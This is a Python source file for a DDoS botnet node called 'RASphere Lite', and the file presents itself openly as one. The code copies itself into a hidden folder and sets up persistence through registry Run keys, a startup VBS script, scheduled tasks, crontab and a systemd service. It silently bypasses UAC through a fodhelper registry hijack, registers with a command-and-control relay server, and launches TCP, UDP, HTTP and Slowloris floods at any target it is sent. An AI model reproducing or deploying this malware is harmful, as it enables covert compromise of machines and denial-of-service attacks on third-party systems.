#!/usr/bin/env python3
"""
RASphere Lite - DDoS Bot Node
==============================
Stripped-down client with ONLY DDoS capability.
Auto-installs persistence to %APPDATA%/.rasphere-lite/ on every run.

Compile: python build_client_lite.py
"""

import os, sys, io, re, json, time, base64, ctypes, shutil, socket
import signal, logging, random, argparse, threading, subprocess
from pathlib import Path
from datetime import datetime
from collections import deque

# ══════════════════════════════════════════════════════════════════════
# CONFIGURE THESE BEFORE COMPILING
# ══════════════════════════════════════════════════════════════════════
_SERVER  = "https://rasphere.onrender.com"   # Relay server URL
_SECRET  = "rasphere-client-key-2024"        # Client secret key
_RECON   = 5                                  # Reconnect delay (seconds)
_RECON_MAX = 120                              # Max reconnect delay
_CLIENT_ID = None                             # None = auto-generate
_KEEPALIVE = 300                              # Keep-alive ping interval
# ══════════════════════════════════════════════════════════════════════

# ── SocketIO ──────────────────────────────────────────────────────────
try:
    import socketio as sio_lib
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "python-socketio[client]"], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import socketio as sio_lib

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s",
                    handlers=[logging.StreamHandler()])
log = logging.getLogger("RAS-Lite")

# ── Persistence helpers ──────────────────────────────────────────────
def _exepath():
    if getattr(sys, 'frozen', False): return sys.executable
    return os.path.abspath(sys.argv[0])

def _pdir():
    if sys.platform == "win32":
        b = os.environ.get("APPDATA", os.path.expanduser("~"))
        p = os.path.join(b, ".rasphere-lite")
    else:
        p = os.path.expanduser("~/.rasphere-lite")
    os.makedirs(p, exist_ok=True)
    return p

def install_persist(url, secret, rec, cid):
    ep = _exepath(); pd = _pdir()
    dest = os.path.join(pd, "RASphereLite.exe" if sys.platform == "win32" else "rasphere-lited")
    if ep != dest:
        try: shutil.copy2(ep, dest); log.info(f"Copied: {dest}")
        except Exception as e: log.warning(f"Copy fail: {e}"); dest = ep
    ca = [dest, "--server", url or _SERVER, "--secret", secret or _SECRET,
          "--reconnect", str(rec or _RECON), "--no-persist"]
    if cid: ca += ["--id", cid]
    cl = subprocess.list2cmdline(ca)
    ok = False
    if sys.platform == "win32":
        # Registry Run
        try:
            import winreg as wr
            k = wr.OpenKey(wr.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, wr.KEY_SET_VALUE)
            wr.SetValueEx(k, "RASphereLite", 0, wr.REG_SZ, cl); wr.CloseKey(k); ok = True
            log.info("Persistence: Registry Run OK")
        except Exception as e: log.warning(f"Reg persist fail: {e}")
        # Startup folder VBS
        try:
            startup = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
            vbs_path = os.path.join(startup, "RASphereLite.vbs")
            with open(vbs_path, "w") as f:
                f.write(f'CreateObject("WScript.Shell").Run "{cl}", 0, False\n')
            ok = True
        except Exception as e: log.warning(f"Startup persist fail: {e}")
        # Scheduled Task
        try:
            task_name = "RASphereLite"
            subprocess.run(["schtasks", "/create", "/f", "/tn", task_name, "/tr", cl,
                          "/sc", "onlogon", "/rl", "highest"], capture_output=True,
                          creationflags=subprocess.CREATE_NO_WINDOW)
            ok = True
        except Exception as e: log.warning(f"Task persist fail: {e}")
    else:
        # Linux/Mac - crontab + systemd
        try:
            subprocess.run(f'(crontab -l 2>/dev/null; echo "@reboot {cl}") | crontab -', shell=True)
            ok = True
        except: pass
        try:
            svc = f"""[Unit]\nDescription=RASphere Lite DDoS Node\nAfter=network.target\n[Service]\nType=simple\nExecStart={cl}\nRestart=always\n[Install]\nWantedBy=default.target\n"""
            sp = os.path.expanduser("~/.config/systemd/user")
            os.makedirs(sp, exist_ok=True)
            with open(os.path.join(sp, "rasphere-lite.service"), "w") as f: f.write(svc)
            subprocess.run(["systemctl", "--user", "daemon-reload"], capture_output=True)
            subprocess.run(["systemctl", "--user", "enable", "rasphere-lite.service"], capture_output=True)
            ok = True
        except: pass
    return ok

def uninstall_persist():
    try:
        if sys.platform == "win32":
            import winreg as wr
            try:
                k = wr.OpenKey(wr.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, wr.KEY_SET_VALUE)
                wr.DeleteValue(k, "RASphereLite"); wr.CloseKey(k)
            except: pass
            try:
                startup = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
                os.remove(os.path.join(startup, "RASphereLite.vbs"))
            except: pass
            try:
                subprocess.run(["schtasks", "/delete", "/f", "/tn", "RASphereLite"], capture_output=True,
                              creationflags=subprocess.CREATE_NO_WINDOW)
            except: pass
        else:
            subprocess.run("crontab -l 2>/dev/null | grep -v rasphere-lite | crontab -", shell=True)
            try:
                subprocess.run(["systemctl", "--user", "disable", "rasphere-lite.service"], capture_output=True)
                subprocess.run(["systemctl", "--user", "stop", "rasphere-lite.service"], capture_output=True)
                os.remove(os.path.expanduser("~/.config/systemd/user/rasphere-lite.service"))
            except: pass
        # Remove directory
        try:
            pd = _pdir()
            for f in os.listdir(pd):
                try: os.remove(os.path.join(pd, f))
                except: pass
            os.rmdir(pd)
        except: pass
        log.info("Persistence removed")
    except Exception as e: log.warning(f"Uninstall err: {e}")

# ── DDoS Engine ──────────────────────────────────────────────────────
class DdosEngine:
    """Multi-threaded DDoS attack engine supporting TCP, UDP, HTTP, Slowloris."""
    def __init__(self, sio):
        self.r = False; self.sio = sio
        self._target = ""; self._port = 80; self._method = "tcp"
        self._threads = []; self._lock = threading.Lock()
        self.stats = {"packets": 0, "data_bytes": 0, "start_time": 0}
        self._last_ps = 0; self._last_bytes = 0; self._last_time = 0

    def start(self, target, port=80, threads=50, packet_size=1024, method="tcp"):
        if self.r: self.stop()
        # Validate and clamp
        threads = max(1, min(500, int(threads or 50)))
        packet_size = max(64, min(65500, int(packet_size or 1024)))
        method = method.lower() if method in ("tcp","udp","http","slowloris") else "tcp"
        # Resolve target
        try: target_ip = socket.gethostbyname(target)
        except: target_ip = target
        self.r = True
        self._target = target_ip; self._port = int(port or 80)
        self._method = method; self._packet_size = packet_size
        self.stats = {"packets": 0, "data_bytes": 0, "start_time": time.time()}
        self._last_ps = 0; self._last_bytes = 0; self._last_time = time.time()
        self._threads = []
        for i in range(threads):
            t = threading.Thread(target=self._worker, args=(i,), daemon=True)
            t.start(); self._threads.append(t)
        # Stats reporter
        threading.Thread(target=self._stats_reporter, daemon=True).start()
        if self.sio and self.sio.connected:
            self.sio.emit("ddos_status", {"active": True, "target": target_ip, "port": self._port,
                "threads": threads, "packet_size": packet_size, "method": method,
                "packets": 0, "pps": 0, "data_mb": 0.0, "duration": 0, "log": [f"[INFO] Attack started on {target_ip}:{self._port} ({method.upper()})"]})

    def stop(self):
        self.r = False
        for t in self._threads:
            try: t.join(timeout=1)
            except: pass
        self._threads = []
        if self.sio and self.sio.connected:
            d = time.time() - self.stats.get("start_time", time.time())
            self.sio.emit("ddos_status", {"active": False, "target": "", "port": 0,
                "threads": 0, "packet_size": 0, "method": "", "packets": self.stats.get("packets",0),
                "pps": 0, "data_mb": round(self.stats.get("data_bytes",0)/(1024*1024), 2),
                "duration": round(d, 1), "log": [f"[INFO] Attack stopped. Duration: {round(d,1)}s"]})

    def _worker(self, tid):
        payload = os.urandom(self._packet_size)
        if self._method == "tcp":
            while self.r:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((self._target, self._port))
                    s.send(payload); s.close()
                    with self._lock: self.stats["packets"] += 1; self.stats["data_bytes"] += len(payload)
                except: pass
        elif self._method == "udp":
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while self.r:
                try:
                    s.sendto(payload, (self._target, self._port))
                    with self._lock: self.stats["packets"] += 1; self.stats["data_bytes"] += len(payload)
                except: pass
        elif self._method == "http":
            import urllib.request
            proto = "https" if self._port == 443 else "http"
            url = f"{self._target}:{self._port}" if self._port not in (80, 443) else self._target
            full_url = f"{proto}://{url}/"
            while self.r:
                try:
                    r = urllib.request.urlopen(full_url, timeout=3)
                    r.read(); r.close()
                    with self._lock: self.stats["packets"] += 1; self.stats["data_bytes"] += 1024
                except: pass
        elif self._method == "slowloris":
            socks = []
            while self.r:
                try:
                    if len(socks) < 200:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(5)
                        s.connect((self._target, self._port))
                        s.send(f"GET / HTTP/1.1\r\nHost: {self._target}\r\n".encode())
                        socks.append(s)
                    for s in list(socks):
                        try:
                            s.send(f"X-Header-{random.randint(0,9999)}: {random.randint(0,9999)}\r\n".encode())
                            with self._lock: self.stats["packets"] += 1
                        except:
                            try: s.close()
                            except: pass
                            socks.remove(s)
                    time.sleep(1)
                except:
                    time.sleep(0.5)

    def _stats_reporter(self):
        while self.r:
            time.sleep(2)
            if not self.r: break
            with self._lock:
                now = time.time()
                dt = now - self._last_time if self._last_time else 1
                pps = int((self.stats["packets"] - self._last_ps) / dt)
                mbps = round((self.stats["data_bytes"] - self._last_bytes) / (1024*1024) / dt, 2)
                self._last_ps = self.stats["packets"]
                self._last_bytes = self.stats["data_bytes"]
                self._last_time = now
            if self.sio and self.sio.connected:
                dur = round(now - self.stats["start_time"], 1)
                self.sio.emit("ddos_status", {
                    "active": True,
                    "packets": self.stats["packets"],
                    "pps": pps,
                    "data_mb": round(self.stats["data_bytes"]/(1024*1024), 2),
                    "duration": dur
                })

# ── Main ─────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="RASphere Lite - DDoS Bot Node")
    parser.add_argument("--server", default=_SERVER)
    parser.add_argument("--secret", default=_SECRET)
    parser.add_argument("--id", default=None)
    parser.add_argument("--reconnect", type=int, default=_RECON)
    parser.add_argument("--no-persist", action="store_true")
    parser.add_argument("--install", action="store_true")
    parser.add_argument("--uninstall", action="store_true")
    parser.add_argument("--no-elevate", action="store_true")
    parser.add_argument("--elevated", action="store_true")
    args = parser.parse_args()

    if args.uninstall:
        uninstall_persist()
        sys.exit(0)
    if args.install:
        install_persist(args.server, args.secret, args.reconnect, args.id)
        sys.exit(0)

    # UAC bypass (silent) - Windows only
    if sys.platform == "win32" and not args.elevated and not args.no_elevate:
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            is_admin = False
        if not is_admin:
            log.info("Not admin - attempting UAC bypass...")
            try:
                import winreg as wr
                exe_path = _exepath()
                # Keep current args, add --elevated
                elevated_args = [a for i, a in enumerate(sys.argv) if a not in ("--uninstall","--install","--no-elevate")]
                elevated_args.append("--elevated")
                cmd = subprocess.list2cmdline([exe_path] + elevated_args[1:] if len(elevated_args) > 1 else [exe_path, "--elevated"])
                reg_path = r"Software\Classes\ms-settings\Shell\open\command"
                try:
                    k = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
                    wr.DeleteValue(k, "DelegateExecute"); wr.CloseKey(k)
                except: pass
                k = wr.CreateKey(wr.HKEY_CURRENT_USER, reg_path)
                wr.SetValueEx(k, "", 0, wr.REG_SZ, cmd)
                wr.SetValueEx(k, "DelegateExecute", 0, wr.REG_SZ, "")
                wr.CloseKey(k)
                fodhelper = os.path.join(os.environ.get("WINDIR","C:\\Windows"), "System32", "fodhelper.exe")
                subprocess.Popen(fodhelper, creationflags=subprocess.CREATE_NO_WINDOW | 0x00000008, close_fds=True)
                time.sleep(0.5); os._exit(0)
            except Exception as e:
                log.warning(f"UAC bypass failed: {e}")

    # Clean UAC reg keys
    if args.elevated and sys.platform == "win32":
        try:
            import winreg as wr
            for p in [r"Software\Classes\ms-settings\Shell\open\command",
                      r"Software\Classes\ms-settings\Shell\open",
                      r"Software\Classes\ms-settings\Shell",
                      r"Software\Classes\ms-settings"]:
                try: wr.DeleteKey(wr.HKEY_CURRENT_USER, p)
                except: pass
        except: pass

    # Persistence
    if not args.no_persist:
        install_persist(args.server, args.secret, args.reconnect, args.id)

    # Client ID
    cid = args.id or f"LITE-{socket.gethostname()}-{random.randint(1000,9999)}"

    # SocketIO
    sio = sio_lib.Client()
    ddos = DdosEngine(sio)

    # Keep-alive pinger thread
    keepalive_stop = threading.Event()
    def pinger():
        import urllib.request
        health_url = args.server.rstrip("/") + "/api/health"
        while not keepalive_stop.is_set():
            keepalive_stop.wait(_KEEPALIVE)
            if keepalive_stop.is_set(): break
            try: urllib.request.urlopen(health_url, timeout=10)
            except: pass

    @sio.on("connect")
    def _conn():
        log.info(f"Connected to {args.server}")
        sio.emit("client_register", {
            "secret": args.secret,
            "client_id": cid,
            "info": {"hostname": socket.gethostname(), "platform": sys.platform,
                     "version": "lite-1.0", "type": "ddos-node"}
        })

    @sio.on("registration_ok")
    def _reg_ok(data):
        log.info(f"Registered as {data.get('client_id', cid)}")

    @sio.on("auth_required")
    def _auth_req(data):
        log.error(f"Auth failed: {data}"); sio.disconnect()

    @sio.on("disconnect")
    def _disc():
        log.warning("Disconnected")

    # DDoS handlers
    @sio.on("ddos_start")
    def _ddos_start(d=None):
        d = d or {}
        ddos.start(d.get("target",""), d.get("port",80), d.get("threads",50),
                   d.get("packet_size",1024), d.get("method","tcp"))

    @sio.on("ddos_stop")
    def _ddos_stop(d=None):
        ddos.stop()

    @sio.on("kill_switch")
    def _ks(d=None):
        log.warning("KILL SWITCH"); ddos.stop(); keepalive_stop.set()
        sio.disconnect(); os._exit(0)

    # Connection loop
    threading.Thread(target=pinger, daemon=True).start()
    rec_delay = args.reconnect
    while True:
        try:
            sio.connect(args.server, wait_timeout=10)
            rec_delay = args.reconnect
            sio.wait()
        except KeyboardInterrupt: break
        except Exception as e:
            log.warning(f"Connection failed: {e}")
            keepalive_stop.set()
            time.sleep(rec_delay)
            rec_delay = min(rec_delay * 2, _RECON_MAX)

if __name__ == "__main__":
    main()
